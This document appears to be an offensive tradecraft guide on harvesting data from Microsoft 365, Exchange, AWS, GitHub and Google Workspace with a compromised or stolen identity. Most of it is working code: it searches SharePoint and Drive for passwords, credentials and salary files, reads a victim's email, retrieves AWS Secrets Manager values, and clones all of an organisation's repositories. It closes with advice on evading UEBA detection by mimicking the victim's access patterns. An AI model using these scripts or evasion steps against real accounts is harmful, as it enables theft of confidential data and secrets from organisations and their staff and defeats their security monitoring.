# SaaS and cloud platform harvesting

Collecting data from SaaS platforms and cloud environments using a
controlled identity. These techniques use the platform's own APIs, making
the activity largely indistinguishable from legitimate user behaviour.

## Enumerate what the identity can reach

Before bulk collection, understand the scope of what is accessible:

```python
import requests

headers = {'Authorization': f'Bearer {access_token}'}

# Microsoft Graph: what subscribed services are in scope?
r = requests.get('https://graph.microsoft.com/v1.0/subscribedSkus', headers=headers)
for sku in r.json().get('value', []):
    print(sku['skuPartNumber'])

# what roles does the current identity have?
r = requests.get('https://graph.microsoft.com/v1.0/me/memberOf', headers=headers)
for group in r.json().get('value', []):
    print(group.get('displayName'), group.get('mail'))
```

## Microsoft 365 / SharePoint

```python
# enumerate all SharePoint sites
r = requests.get('https://graph.microsoft.com/v1.0/sites?search=*', headers=headers)
for site in r.json().get('value', []):
    print(site['id'], site['displayName'], site['webUrl'])

# list drives (document libraries) on a site
r = requests.get(f"https://graph.microsoft.com/v1.0/sites/{site_id}/drives",
                 headers=headers)

# search for keywords across all content accessible to the identity
search_terms = ['password', 'credentials', 'invoice', 'contract', 'salary', 'acquisition']
for term in search_terms:
    r = requests.get(
        f"https://graph.microsoft.com/v1.0/me/drive/root/search(q='{term}')",
        headers=headers)
    for item in r.json().get('value', []):
        print(term, item['name'], item.get('webUrl'))
```

```python
# download a file from OneDrive
r = requests.get(
    f"https://graph.microsoft.com/v1.0/me/drive/items/{item_id}/content",
    headers=headers)
with open(item_name, 'wb') as f:
    f.write(r.content)
```

## Exchange Online (email)

```python
# read email from the compromised account
r = requests.get(
    'https://graph.microsoft.com/v1.0/me/messages'
    '?$select=subject,from,receivedDateTime,hasAttachments'
    '&$orderby=receivedDateTime desc&$top=50',
    headers=headers)
for msg in r.json().get('value', []):
    print(msg['receivedDateTime'], msg['from']['emailAddress']['address'], msg['subject'])

# search for emails with keywords
r = requests.get(
    "https://graph.microsoft.com/v1.0/me/messages?$search=\"password reset\"",
    headers=headers)
```

## AWS: enumerate accessible resources

```python
import boto3

# with stolen credentials
session = boto3.Session(
    aws_access_key_id=KEY_ID,
    aws_secret_access_key=SECRET,
    aws_session_token=SESSION_TOKEN)

# S3: list buckets and objects
s3 = session.client('s3')
for bucket in s3.list_buckets()['Buckets']:
    print('Bucket:', bucket['Name'])
    try:
        objs = s3.list_objects_v2(Bucket=bucket['Name']).get('Contents', [])
        for obj in objs:
            print(' ', obj['Key'], obj['Size'])
    except Exception:
        pass  # no access to this bucket

# Secrets Manager: list and retrieve secrets
sm = session.client('secretsmanager', region_name='eu-west-1')
for secret in sm.list_secrets()['SecretList']:
    print('Secret:', secret['Name'])
    try:
        value = sm.get_secret_value(SecretId=secret['Name'])
        print(' Value:', value.get('SecretString', '[binary]'))
    except Exception:
        pass
```

## GitHub / GitLab

```bash
# GitHub API: list repositories accessible to the token
curl -H "Authorization: token TOKEN" https://api.github.com/user/repos

# search for secrets in all accessible repos (requires organisation access)
curl -H "Authorization: token TOKEN" \
  "https://api.github.com/search/code?q=password+user:ORG"

# list GitHub Actions secrets (only names, not values)
curl -H "Authorization: token TOKEN" \
  https://api.github.com/repos/ORG/REPO/actions/secrets

# clone all repos in an organisation
curl -H "Authorization: token TOKEN" \
  https://api.github.com/orgs/ORG/repos?per_page=100 |
  python3 -c "import json,sys; [print(r['clone_url']) for r in json.load(sys.stdin)]" |
  while read url; do git clone "$url"; done
```

## Google Workspace

```python
from googleapiclient.discovery import build
from google.oauth2.credentials import Credentials

creds = Credentials(token=ACCESS_TOKEN)
drive = build('drive', 'v3', credentials=creds)

# list files
results = drive.files().list(
    pageSize=100,
    fields="files(id, name, mimeType, size, modifiedTime)").execute()
for f in results.get('files', []):
    print(f['name'], f.get('mimeType'), f.get('size', 'N/A'))

# search for sensitive files
results = drive.files().list(
    q="name contains 'password' or name contains 'credentials' or fullText contains 'secret'",
    fields="files(id, name, webViewLink)").execute()
```

## Rate limiting and detection avoidance

Most SaaS platforms rate-limit their APIs and some log unusual access patterns:

- Spread bulk download requests over time rather than downloading everything
  in a single burst
- Mimic the access patterns of the compromised user: download files the
  user would plausibly access, not every file in every drive
- Avoid accessing resources the user has never accessed before in quick
  succession; UEBA tools baseline normal access patterns
- If the platform exposes recent activity (e.g., "recently accessed files"),
  accessing only those items is lower risk than broad enumeration
